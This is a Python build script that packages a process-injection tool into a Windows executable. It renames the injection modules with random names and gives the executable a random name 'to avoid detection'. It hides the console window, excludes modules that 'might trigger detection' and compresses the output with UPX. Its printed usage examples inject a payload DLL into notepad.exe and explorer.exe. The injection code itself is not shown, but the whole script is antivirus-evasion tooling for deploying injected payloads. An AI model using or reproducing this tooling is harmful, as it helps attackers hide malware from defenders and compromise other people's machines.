import os
import sys
import random
import string
import shutil
import argparse
import subprocess

def generate_random_string(length=8):
    """Generate a random string for obfuscation purposes"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def obfuscate_names():
    """Rename key files with random names to avoid detection"""
    new_names = {}
    
    # Files to rename
    files_to_rename = [
        'modules/process_injection.py',
        'modules/demo_injection.py'
    ]
    
    for file in files_to_rename:
        if os.path.exists(file):
            # Generate a random name with same extension
            base_dir = os.path.dirname(file)
            ext = os.path.splitext(file)[1]
            new_name = f"{base_dir}/{generate_random_string(12)}{ext}"
            
            # Create a copy with the new name
            shutil.copy(file, new_name)
            new_names[file] = new_name
            print(f"[+] Renamed {file} to {new_name}")
    
    return new_names

def fix_imports(new_names):
    """Fix imports in the renamed files"""
    for original, new_name in new_names.items():
        if original == 'modules/demo_injection.py':
            # Fix the import in the demo file
            with open(new_name, 'r') as f:
                content = f.read()
            
            # Replace import statement
            injection_file = os.path.basename(new_names.get('modules/process_injection.py', ''))
            if injection_file:
                module_name = os.path.splitext(injection_file)[0]
                new_content = content.replace(
                    'from process_injection import ProcessInjector, xor_decrypt',
                    f'from {module_name} import ProcessInjector, xor_decrypt'
                )
                
                with open(new_name, 'w') as f:
                    f.write(new_content)
                print(f"[+] Fixed imports in {new_name}")

def build_with_pyinstaller(main_file, icon=None, upx=False, one_file=True, console=False):
    """Build executable with PyInstaller"""
    try:
        # Check if PyInstaller is installed
        subprocess.run(['pyinstaller', '--version'], check=True, stdout=subprocess.PIPE)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[-] PyInstaller not found. Installing...")
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], check=True)
    
    # Build command
    cmd = ['pyinstaller']
    
    # Add options
    if one_file:
        cmd.append('--onefile')
    if not console:
        cmd.append('--noconsole')
    if icon and os.path.exists(icon):
        cmd.extend(['--icon', icon])
    
    # Add random name for the exe
    output_name = generate_random_string(8)
    cmd.extend(['--name', output_name])
    
    # Exclude some modules that might trigger detection
    cmd.extend(['--exclude-module', 'unittest'])
    
    # Add the main file
    cmd.append(main_file)
    
    # Run PyInstaller
    print(f"[*] Building executable with command: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)
    
    # Compress with UPX if requested
    if upx:
        print("[*] Compressing with UPX...")
        try:
            upx_cmd = ['upx', f'dist/{output_name}.exe']
            subprocess.run(upx_cmd, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[-] UPX not found or failed. Skipping compression.")
    
    print(f"[+] Build complete. Executable: dist/{output_name}.exe")
    return f"dist/{output_name}.exe"

def main():
    parser = argparse.ArgumentParser(description='Build and obfuscate process injector')
    parser.add_argument('--icon', help='Icon file for the executable')
    parser.add_argument('--no-upx', action='store_true', help='Disable UPX compression')
    parser.add_argument('--console', action='store_true', help='Show console window')
    args = parser.parse_args()
    
    print("[*] Starting build process...")
    
    # Obfuscate file names
    new_names = obfuscate_names()
    
    # Fix imports in renamed files
    fix_imports(new_names)
    
    # Choose the main file (the renamed demo_injection.py)
    main_file = new_names.get('modules/demo_injection.py')
    if not main_file:
        print("[-] Error: Could not find renamed demo file")
        return 1
    
    # Build with PyInstaller
    exe_path = build_with_pyinstaller(
        main_file=main_file,
        icon=args.icon,
        upx=not args.no_upx,
        console=args.console
    )
    
    print(f"[+] Successfully built {exe_path}")
    print("[*] Usage example:")
    print(f"    {exe_path} --target notepad.exe")
    print(f"    {exe_path} --target explorer.exe --dll path/to/payload.dll")
    
    return 0

if __name__ == "__main__":
    sys.exit(main()) 